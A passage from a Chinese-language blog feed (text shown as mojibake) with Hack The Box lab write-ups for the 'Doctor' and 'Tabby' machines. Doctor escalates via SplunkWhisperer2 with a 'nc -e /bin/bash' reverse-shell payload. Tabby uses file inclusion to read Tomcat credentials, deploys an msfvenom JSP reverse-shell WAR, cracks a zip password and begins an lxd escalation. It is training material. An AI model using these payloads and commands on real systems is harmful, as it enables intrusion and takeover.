<h3 id="6-å‡çº§shell"><a href="#6-å‡çº§shell" class="headerlink" title="6.å‡çº§shell"></a>6.å‡çº§shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:~$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/doctor# stty raw -echo</span><br><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">web@doctor:~$ </span><br><span class="line">web@doctor:~$ pwd</span><br><span class="line">/home/web</span><br><span class="line">web@doctor:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x04-ç™»å…¥åˆ°shaunç”¨æˆ·"><a href="#0x04-ç™»å…¥åˆ°shaunç”¨æˆ·" class="headerlink" title="0x04.ç™»å…¥åˆ°shaunç”¨æˆ·"></a>0x04.ç™»å…¥åˆ°shaunç”¨æˆ·</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:~$ cd /home/</span><br><span class="line">web@doctor:/home$ ls</span><br><span class="line">shaun  web</span><br><span class="line">web@doctor:/home$ cd shaun/</span><br><span class="line">web@doctor:/home/shaun$ ls</span><br><span class="line">user.txt</span><br><span class="line">web@doctor:/home/shaun$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">web@doctor:/home/shaun$</span><br></pre></td></tr></table></figure>

<p><code>çˆ¬å–æ–‡ä»¶</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:~/blog$ cd /var/www/html/ </span><br><span class="line">web@doctor:/var/www/html$ ls</span><br><span class="line">about.html  contact.html  departments.html  images      js</span><br><span class="line">blog.html   css           fonts             index.html  services.html</span><br><span class="line">web@doctor:/var/www/html$ cd /var/lo</span><br><span class="line">local/ lock/  log/   </span><br><span class="line">web@doctor:/var/www/html$ cd /var/log/apache2/</span><br><span class="line">web@doctor:/var/log/apache2$ ls</span><br><span class="line">access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz</span><br><span class="line">access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz</span><br><span class="line">access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz</span><br><span class="line">access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz</span><br><span class="line">access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz</span><br><span class="line">access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log</span><br><span class="line">access.log.3.gz   error.log        error.log.3.gz</span><br><span class="line">access.log.4.gz   error.log.1      error.log.4.gz</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup </span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;\x16\x03&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;t3 12.1.2\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;PROPFIND / HTTP/1.1&quot; 405 521 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 453 &quot;-&quot; </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">çœç•¥ä¸€å¤§å †ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup | grep pass</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;</span><br><span class="line">web@doctor:/var/log/apache2$ </span><br></pre></td></tr></table></figure>

<p><code>å¾—åˆ°shaunå¯†ç [Guitar123]ï¼Œç™»å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:/var/log/apache2$ su shaun</span><br><span class="line">Password: </span><br><span class="line">shaun@doctor:/var/log/apache2$ whoami</span><br><span class="line">shaun</span><br><span class="line">shaun@doctor:/var/log/apache2$ </span><br><span class="line">shaun@doctor:/var/log/apache2$ cd</span><br><span class="line">shaun@doctor:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">shaun@doctor:~$ cat user.txt </span><br><span class="line">**************************************</span><br><span class="line">shaun@doctor:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x05-ææƒ"><a href="#0x05-ææƒ" class="headerlink" title="0x05.ææƒ"></a>0x05.ææƒ</h2><h3 id="1-shaunæ²¡æœ‰æƒé™"><a href="#1-shaunæ²¡æœ‰æƒé™" class="headerlink" title="1.shaunæ²¡æœ‰æƒé™"></a>1.shaunæ²¡æœ‰æƒé™</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shaun@doctor:/home/web$ sudo -l</span><br><span class="line">[sudo] password for shaun: </span><br><span class="line">Sorry, user shaun may not run sudo on doctor.</span><br><span class="line">shaun@doctor:/home/web$</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xY2VhOTViYjM1OGM=">ä»€ä¹ˆæ˜¯splunk<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="2-åˆ©ç”¨splunkææƒåœ°å€"><a href="#2-åˆ©ç”¨splunkææƒåœ°å€" class="headerlink" title="2.åˆ©ç”¨splunkææƒåœ°å€"></a>2.åˆ©ç”¨splunkææƒ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyLmdpdA==">åœ°å€<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# git clone https://github.com/cnotin/SplunkWhisperer2</span><br><span class="line">æ­£å…‹éš†åˆ° &#x27;SplunkWhisperer2&#x27;...</span><br><span class="line">remote: Enumerating objects: 7, done.</span><br><span class="line">remote: Counting objects: 100% (7/7), done.</span><br><span class="line">remote: Compressing objects: 100% (6/6), done.</span><br><span class="line">remote: Total 55 (delta 1), reused 2 (delta 1), pack-reused 48</span><br><span class="line">å±•å¼€å¯¹è±¡ä¸­: 100% (55/55), 20.68 KiB | 162.00 KiB/s, å®Œæˆ.</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# ls</span><br><span class="line">nmap.CVT  SplunkWhisperer2  user</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# cd SplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# ls</span><br><span class="line">LICENSE  PySplunkWhisperer2  README.md  SharpSplunkWhisperer2</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# cd PySplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# proxychains pip2 install -r requirements.txt </span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support</span><br><span class="line">Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 1)) (2.22.0)</span><br><span class="line">|DNS-request| pypi.org </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| pypi.org is 151.101.64.223</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.64.223:443-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">WARNING: You are using pip version 20.2.2; however, version 20.2.4 is available.</span><br><span class="line">You should consider upgrading via the &#x27;/usr/bin/python2 -m pip install --upgrade pip&#x27; command.</span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# chmod +x PySplunkWhisperer2_remote.py </span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2#</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ä½¿ç”¨æ–¹æ³•</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyL2Jsb2IvbWFzdGVyL1B5U3BsdW5rV2hpc3BlcmVyMi9SRUFETUUubWQ=">readme<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="3-kaliå…ˆç›‘å¬8888"><a href="#3-kaliå…ˆç›‘å¬8888" class="headerlink" title="3.kaliå…ˆç›‘å¬8888"></a>3.kaliå…ˆç›‘å¬8888</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-æ‰§è¡Œ"><a href="#4-æ‰§è¡Œ" class="headerlink" title="4.æ‰§è¡Œ"></a>4.æ‰§è¡Œ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.17.216 --username shaun --password Guitar123 --payload &#x27;nc.traditional -e/bin/bash &#x27;10.10.17.216&#x27; &#x27;8888&#x27;&#x27;</span><br><span class="line">Running in remote mode (Remote Code Execution)</span><br><span class="line">[.] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[.] Creating malicious app bundle...</span><br><span class="line">[+] Created malicious app bundle in: /tmp/tmpo7c3zpu6.tar</span><br><span class="line">[+] Started HTTP server for remote mode</span><br><span class="line">[.] Installing app from: http://10.10.17.216:8181/</span><br><span class="line">10.10.10.209 - - [18/Oct/2020 04:50:53] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">[+] App installed, your code should be running now!</span><br><span class="line"></span><br><span class="line">Press RETURN to cleanup</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-å¾—åˆ°shell"><a href="#5-å¾—åˆ°shell" class="headerlink" title="5.å¾—åˆ°shell"></a>5.å¾—åˆ°shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 49402</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">root@doctor:/# cd</span><br><span class="line">cd</span><br><span class="line">bash: cd: HOME not set</span><br><span class="line">root@doctor:/# ls</span><br><span class="line">ls</span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swapfile  usr</span><br><span class="line">root@doctor:/# ^Z       </span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 8888</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line"></span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# cd /root/</span><br><span class="line">root@doctor:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@doctor:/root# cat root.txt </span><br><span class="line">***********************************</span><br><span class="line">root@doctor:/root#</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[tabby]</title>
    <url>/2020/09/11/HTB-tabby/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/09/11/HTB-tabby/image-20200909145742353.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹å¼€æ”¾äº†22/80/8080(tomcat)ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nmap -sC -sV -sT 10.10.10.194 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 02:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.194</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Mega Hosting</span><br><span class="line">8080/tcp open  http    Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 67.64 seconds</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-å…ˆè®¿é—®80ç«¯å£"><a href="#0x02-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x02.å…ˆè®¿é—®80ç«¯å£"></a>0x02.å…ˆè®¿é—®80ç«¯å£</h2><p><code>å‘ç°æ˜¯ä¸€ä¸ªå–æœåŠ¡å™¨çš„</code></p>
<img src="/2020/09/11/HTB-tabby/image-20200909151511868.png" class>

<p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°NEWé¡µé¢ä¸èƒ½è®¿é—®ï¼Œå¹¶è·³è½¬åˆ°äº†å¦‚ä¸‹é¡µé¢</code></p>
<img src="/2020/09/11/HTB-tabby/image-20200909151641647.png" class>

<p><code>æ·»åŠ ä¸€æ¡hostså†è®¿é—®ï¼Œæåˆ°äº†æ•°æ®æ³„éœ²ï¼Œå¹¶ä¸”æ„Ÿè§‰å­˜åœ¨æ–‡ä»¶åŒ…å«</code></p>
<blockquote>
<p>10.10.10.194    megahosting.htb</p>
</blockquote>
<img src="/2020/09/11/HTB-tabby/image-20200909162808330.png" class>

<p><code>æµ‹è¯•æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ç¡®å®å­˜åœ¨çš„</code></p>
<img src="/2020/09/11/HTB-tabby/image-20200909163047232.png" class>

<h2 id="0x03-è®¿é—®tomcat"><a href="#0x03-è®¿é—®tomcat" class="headerlink" title="0x03.è®¿é—®tomcat"></a>0x03.è®¿é—®tomcat</h2><h3 id="1-å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶"><a href="#1-å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶" class="headerlink" title="1.å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶"></a>1.å‘ç°æ•æ„Ÿç›®å½•åŠæ–‡ä»¶</h3><blockquote>
<p>/var/lib/tomcat9/webapps/ROOT/index.html</p>
<p>/usr/share/tomcat9</p>
<p>/var/lib/tomcat9</p>
<p>/usr/share/doc/tomcat9-common/RUNNING.txt.gz</p>
<p>/etc/tomcat9/tomcat-users.xml</p>
</blockquote>
<img src="/2020/09/11/HTB-tabby/image-20200909170452209.png" class>

<h3 id="2-åŒ…å«æ•æ„Ÿæ–‡ä»¶"><a href="#2-åŒ…å«æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="2.åŒ…å«æ•æ„Ÿæ–‡ä»¶"></a>2.åŒ…å«æ•æ„Ÿæ–‡ä»¶</h3><p><code>ç™¾åº¦å‘ç°tomcat-users.xmlä¸ºç”¨æˆ·ç™»å½•é…ç½®æ–‡ä»¶</code></p>
<blockquote>
<p>ç»è¿‡ä¸æ‡ˆåŠªåŠ›å‘ç°æ–‡ä»¶ä½ç½®</p>
<p>/usr/share/tomcat9/etc/tomcat-users.xml</p>
</blockquote>
<p><code>æŸ¥çœ‹æºç å‘ç°ç”¨æˆ·å¯†ç </code></p>
<img src="/2020/09/11/HTB-tabby/image-20200909172907375.png" class>

<h2 id="0x04-æ„é€ exploit"><a href="#0x04-æ„é€ exploit" class="headerlink" title="0x04.æ„é€ exploit"></a>0x04.æ„é€ exploit</h2><p><span class="exturl" data-url="aHR0cHM6Ly90b21jYXQuYXBhY2hlLm9yZy90b21jYXQtNy4wLWRvYy9tYW5hZ2VyLWhvd3RvLmh0bWwjU3VwcG9ydGVkX01hbmFnZXJfQ29tbWFuZHM=">tomcatç›¸å…³å‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p>
<img src="/2020/09/11/HTB-tabby/image-20200909180557612.png" class>

<p><code>ç”Ÿæˆexp</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.17.216 lport=6666 -f war &gt; exp.war</span></span><br><span class="line">Payload size: 1086 bytes</span><br><span class="line">Final size of war file: 1086 bytes</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ exp</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># curl --user &#x27;tomcat:$3cureP4s5w0rd123!&#x27; --upload-file exp.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/exp.war&quot;</span></span><br><span class="line">OK - Deployed application at context path [/exp.war]</span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>è®¿é—®http://10.10.10.194:8080/exp.waråå¼¹shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.194] 51532</span><br><span class="line">whoami</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure>

<p><code>å‡çº§shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>        </span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ whoami</span><br><span class="line">whoami</span><br><span class="line">tomcat</span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$</span><br></pre></td></tr></table></figure>

<p><code>å‡çº§ä¸ºäº¤äº’shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@tabby:/var/lib/tomcat9$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nc -nvlp 6666</span></span><br><span class="line"></span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ </span><br><span class="line">tomcat@tabby:/var/lib/tomcat9$ whoami</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure>

<h2 id="0x05-å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯"><a href="#0x05-å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯" class="headerlink" title="0x05.å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯"></a>0x05.å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯</h2><blockquote>
<p>åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å‘ç°filesæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªbackup,zipæ–‡ä»¶ï¼ŒçŒœæµ‹ä¸ºå¤‡ä»½æ–‡ä»¶</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@tabby:/var/www/html$ ls</span><br><span class="line">assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt</span><br><span class="line">tomcat@tabby:/var/www/html$ <span class="built_in">cd</span> files/</span><br><span class="line">tomcat@tabby:/var/www/html/files$ ls</span><br><span class="line">16162020_backup.zip  archive  revoked_certs  statement</span><br></pre></td></tr></table></figure>

<p><code>ä¸‹è½½backup.zipï¼Œå¹¶è§£å‹ï¼Œå‘ç°éœ€è¦å¯†ç </code></p>
<img src="/2020/09/11/HTB-tabby/image-20200909183155978.png" class>

<p><code>ä½¿ç”¨fcrackzipçˆ†ç ´è§£å‹å¯†ç ä¸ºadmin@it</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip </span></span><br><span class="line">possible pw found: admin@it ()</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>è§£å‹å¾—åˆ°äº†ä¸€ä¸ªwarç›®å½•ï¼Œä¹Ÿæ²¡å‘ç°å•¥ç©æ„</code></p>
<p><code>ä½†æ‹¿admin@itç™»å…¥ashå´æˆåŠŸäº†ã€‚ã€‚ã€‚ä»€ä¹ˆåŸç†~</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@tabby:/home$ ls</span><br><span class="line">ash</span><br><span class="line">tomcat@tabby:/home$ su ash</span><br><span class="line">Password: </span><br><span class="line">ash@tabby:/home$ </span><br><span class="line">ash@tabby:/home$ ls</span><br><span class="line">ash</span><br><span class="line">ash@tabby:/home$ <span class="built_in">cd</span></span><br><span class="line">ash@tabby:~$ ls</span><br><span class="line">alpine-v3.12-i686-20200909_0437.tar.gz    index.html  tmp</span><br><span class="line">alpine-v3.12-x86_64-20200909_1417.tar.gz  snap        user.txt</span><br><span class="line">ash@tabby:~$ cat user.txt </span><br><span class="line">*************************************</span><br><span class="line">ash@tabby:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhZ2h1bC9seGQtYWxwaW5lLWJ1aWxkZXI=">æœ¬æ¬¡ä½¿ç”¨lxd<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTFhD">LXC/LXDå‚è€ƒ1<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eGNvbnRhaW5lcnMub3JnL2x4Yy9pbnRyb2R1Y3Rpb24v">LXC/LXDå‚è€ƒ2<i class="fa fa-external-link-alt"></i></span></p>
<p><code>å…ˆç”Ÿæˆaplineæ˜ åƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># git clone https://github.com/saghul/lxd-alpine-builder.git</span></span><br><span class="line">æ­£å…‹éš†åˆ° <span class="string">&#x27;lxd-alpine-builder&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 27, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span><br><span class="line">å±•å¼€å¯¹è±¡ä¸­: 100% (27/27), 15.98 KiB | 185.00 KiB/s, å®Œæˆ.</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># ls</span></span><br><span class="line">16162020_backup.zip  exp.war  lxd-alpine-builder  nmap.CVT  user</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># cd lxd-alpine-builder/</span></span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ./build-alpine </span></span><br><span class="line">Determining the latest release... v3.12</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">Downloading alpine-keys-2.2-r0.apk</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: 